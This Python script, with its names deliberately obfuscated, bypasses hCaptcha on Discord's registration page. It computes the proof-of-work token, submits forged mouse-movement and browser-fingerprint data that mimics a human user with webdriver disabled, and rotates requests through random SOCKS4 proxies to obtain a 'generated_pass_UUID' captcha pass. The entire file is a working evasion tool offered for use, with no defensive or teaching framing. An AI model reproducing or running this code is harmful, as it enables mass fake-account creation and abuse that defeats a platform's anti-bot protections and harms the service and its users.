from httpx import Client
from datetime import datetime
from json import loads, dumps
from base64 import b64decode
from hashlib import sha1
from math import floor
from urllib import parse
from httpx_socks import SyncProxyTransport
from random import choice

OO0, O0O = open("proxies.txt", encoding='utf-8').readlines(), {"Host": "hcaptcha.com","Connection": "keep-alive","sec-ch-ua": 'Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92',"Accept": "application/json","sec-ch-ua-mobile": "?0","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36","Content-type": "application/x-www-form-urlencoded","Origin": "https://newassets.hcaptcha.com","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://newassets.hcaptcha.com/","Accept-Language": "en-US,en;q=0.9"}

def OOOOO(__0):
    try:
        __0, OOO = __0.split("."), "0123456789/:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        __0 = {"header": loads(b64decode(f"{__0[0]}=======").decode("utf-8")),"payload": loads(b64decode(f"{__0[1]}=======").decode("utf-8")),"raw": {"header": __0[0], "payload": __0[1], "signature": __0[2]}}

        def OO(__):
            for _ in range(len(__) - 1, -1, -1):
                if __[_] < len(OOO) - 1:
                    __[_] += 1;return True
                __[_] = 0
            return False

        def OOO0(__):
            _ = ""
            for ___ in range(len(__)): _ += OOO[__[___]]
            return _

        def O0OO(_, __):
            _00O, _OO0 = [], sha1(__.encode()).digest()
            for n in range(0, 160): _00O.append(_OO0[-1] >> 1)
            def _i(O00O, O000):
                if O000 in O00O: return O00O.index(O000)
                return -1
            return 0 == _00O[:_][0] and _i(_00O[:_], 1) >= _ - 1 or -1 == _i(_00O[:_], 1)

        def OO0OO():
            for e in range(25):
                n = [0 for i in range(e)]
                while OO(n):
                    if O0OO(__0["payload"]["s"], f'{__0["payload"]["d"]}::{OOO0(n)}'): return OOO0(n)
        return ":".join(["1", str(__0["payload"]["s"]),datetime.now().isoformat()[:19].replace("T", "").replace("-", "").replace(":", ""), __0["payload"]["d"], "", str(OO0OO())])
    except: pass

def Bypass():
    while True:
        try:
            while True:
                try:
                    with Client() as O0:
                        _010 = O0.get("https://hcaptcha.com/checksiteconfig?host=discord.com&sitekey=f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34&sc=1&swa=1", headers=O0O, timeout=5)
                    if _010.json()["pass"]: _011 = _010.json()["c"]
                    _011["type"] = "hsl"
                    break
                except: pass
            with Client(transport=SyncProxyTransport.from_url(f'socks4://{choice(OO0)}')) as O0:
                return O0.post("https://hcaptcha.com/getcaptcha?s=f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34",cookies={"hc_accessibility": "vuDc2nlnitYdvHEAOY9gsWHx3GlkuMuQsT3sf7KacKPp9i5Hm3GFOOiSrqHPr+oIFrZe513iPX/T+8a8T+Jj9nEgedQoslxtn7Q0+PaJKrJ/KK5Jf0ybr/2tKxla/9FZK2WtHa6kQrP6H7qTrKHCc6uZetvjajBt7joiijPQ5BJbJvFOPvzGuECtrzZSlkKG2bKTkPHPQRIBv0dJ8wapxxmS34t+gGmMQRYnlyccnyhLrV71ttYsaoWSc/D9qFcJ9oWj89VmEFtZ+1A3+Az1UyOOjaEMffsY7ogJVQhmfo6SdMgKyDMyJ+23CPHmCPC0fs0VJtSNcG7Ln599w9mrPRlsHk1VRPtfyXZSp+gENfy5PntpbDlQ24+h3DxfBGwdvhfl8XrU4zz4MkgFUxzsCJT9F78aXBZlIoPPhgVQvu1DtRtLBJdbw9TPweuBs2gvWfVx6i9XbMPLh3EHghNMvBUQiXCLGSXZ0lzHPvJlQvWgROER/0FAtmlEL6M1a1Qj3WA6GULh4nZpUxZ+ykQf0NzB5QiCTYUw+tg5HA==hM6a0V//HrbW7xRa"}, data=parse.urlencode({"sitekey": "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34", "v": "b1129b9", "host": "discord.com", "n": OOOOO(_011["req"]), 'motiondata': '{"st":1628923867722,"mm":[[203,16,1628923874730],[155,42,1628923874753],[137,53,1628923874770],[122,62,1628923874793],[120,62,1628923875020],[107,62,1628923875042],[100,61,1628923875058],[93,60,1628923875074],[89,59,1628923875090],[88,59,1628923875106],[87,59,1628923875131],[87,59,1628923875155],[84,56,1628923875171],[76,51,1628923875187],[70,47,1628923875203],[65,44,1628923875219],[63,42,1628923875235],[62,41,1628923875251],[61,41,1628923875307],[58,39,1628923875324],[54,38,1628923875340],[49,36,1628923875363],[44,36,1628923875380],[41,35,1628923875396],[40,35,1628923875412],[38,35,1628923875428],[38,35,1628923875444],[37,35,1628923875460],[37,35,1628923875476],[37,35,1628923875492]],"mm-mp":13.05084745762712,"md":[[37,35,1628923875529]],"md-mp":0,"mu":[[37,35,1628923875586]],"mu-mp":0,"v":1,"topLevel":{"st":1628923867123,"sc":{"availWidth":1680,"availHeight":932,"width":1680,"height":1050,"colorDepth":30,"pixelDepth":30,"availLeft":0,"availTop":23},"nv":{"vendorSub":"","productSub":"20030107","vendor":"Google Inc.","maxTouchPoints":0,"userActivation":{},"doNotTrack":null,"geolocation":{},"connection":{},"webkitTemporaryStorage":{},"webkitPersistentStorage":{},"hardwareConcurrency":12,"cookieEnabled":true,"appCodeName":"Mozilla","appName":"Netscape","appVersion":"5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36","platform":"MacIntel","product":"Gecko","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36","language":"en-US","languages":["en-US","en"],"onLine":true,"webdriver":false,"serial":{},"scheduling":{},"xr":{},"mediaCapabilities":{},"permissions":{},"locks":{},"usb":{},"mediaSession":{},"clipboard":{},"credentials":{},"keyboard":{},"mediaDevices":{},"storage":{},"serviceWorker":{},"wakeLock":{},"deviceMemory":8,"hid":{},"presentation":{},"userAgentData":{},"bluetooth":{},"managed":{},"plugins":["internal-pdf-viewer","mhjfbmdgcfjbbpaeojofohoefgiehjai","internal-nacl-plugin"]},"dr":"https://discord.com/","inv":false,"exec":false,"wn":[[1463,731,2,1628923867124],[733,731,2,1628923871704]],"wn-mp":4580,"xy":[[0,0,1,1628923867125]],"xy-mp":0,"mm":[[1108,233,1628923867644],[1110,230,1628923867660],[1125,212,1628923867678],[1140,195,1628923867694],[1158,173,1628923867711],[1179,152,1628923867727],[1199,133,1628923867744],[1221,114,1628923867768],[1257,90,1628923867795],[1272,82,1628923867811],[1287,76,1628923867827],[1299,71,1628923867844],[1309,68,1628923867861],[1315,66,1628923867877],[1326,64,1628923867894],[1331,62,1628923867911],[1336,60,1628923867927],[1339,58,1628923867944],[1343,56,1628923867961],[1345,54,1628923867978],[1347,53,1628923867994],[1348,52,1628923868011],[1350,51,1628923868028],[1354,49,1628923868045],[1366,44,1628923868077],[1374,41,1628923868094],[1388,36,1628923868110],[1399,31,1628923868127],[1413,25,1628923868144],[1424,18,1628923868161],[1436,10,1628923868178],[1445,3,1628923868195],[995,502,1628923871369],[722,324,1628923874673],[625,356,1628923874689],[523,397,1628923874705],[457,425,1628923874721]],"mm-mp":164.7674418604651},"session":[],"widgetList":["0a1l5c3yudk4"],"widgetId":"0a1l5c3yudk4","href":"https://discord.com/register","prev":{"escaped":false,"passed":false,"expiredChallenge":false,"expiredResponse":false}}', "hl": "en","c": dumps(_011)}), headers=O0O, timeout=5).json()['generated_pass_UUID']
        except:
            pass
